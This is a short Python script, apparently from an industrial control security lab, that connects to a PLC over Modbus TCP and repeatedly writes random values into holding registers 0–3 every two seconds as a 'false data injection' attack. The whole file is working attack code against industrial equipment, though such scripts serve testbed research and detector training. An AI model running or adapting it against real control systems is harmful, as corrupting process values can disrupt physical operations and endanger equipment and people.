# scripts/attack_injection/false_data_injection.py

import time, random
from pymodbus.client import ModbusTcpClient

def main():
    client = ModbusTcpClient('192.168.64.1', port=502)
    if not client.connect():
        print("ERROR: Cannot connect to PLC")
        return

    print("Starting false data injection into registers 0–3 every 2s...")
    try:
        while True:
            reg = random.randint(0, 3)
            val = random.randint(0, 10000)
            rq = client.write_register(reg, val, slave=1)
            if rq.isError():
                print(f"Write error at reg {reg}: {rq}")
            else:
                print(f"Injected {val} into register {reg}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopped by user")
    finally:
        client.close()

if __name__ == "__main__":
    main()
